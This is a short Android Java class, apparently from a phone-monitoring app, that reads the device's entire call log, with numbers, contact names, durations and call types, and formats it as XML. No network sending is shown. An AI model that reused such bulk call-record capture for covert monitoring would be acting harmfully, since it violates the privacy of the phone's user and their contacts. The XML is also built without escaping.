package com.isoc.android.monitor;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.annotation.Nullable;

/**

 
 */
public class ContactsCapture {

    @Nullable
    private static String[][] getCallLog(Context context) {
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE+ " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int name = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

        String[][] result = new String[cursor.getCount()][5];
        int i = 0;
        while (cursor.moveToNext()) {
            result[i][0] = cursor.getString(number);
            result[i][1] = cursor.getString(duration);
            result[i][3] = cursor.getString(date);
            String contactName=cursor.getString(name);
            result[i][4]=(contactName==null) ? "Unknown" : contactName;

            String callType = new String();
            switch (Integer.parseInt(cursor.getString(type))) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callType = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callType = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callType = "Missed";
                    break;
                default:
                    callType = "Unknown";
                    break;
            }
            result[i][2] = callType;
            i++;
        }
        cursor.close();
        return result;
    }

    protected static String getCallXML(Context context,String timeFormat) {
        String[][] callLog = getCallLog(context);
        StringBuilder result=new StringBuilder();
        if (callLog != null)
            for (String[] call : callLog) {
                long seconds = Long.parseLong(call[3]);
                result.append("<call time=\"" + TimeCapture.getTime(timeFormat,Long.parseLong(call[3])) + "\" type=\"" + call[2] + "\" duration=\"" + call[1] + "\" name=\"" + call[4] + "\">" + call[0] + "</call>\n");
            }
        return result.toString();
    }
}
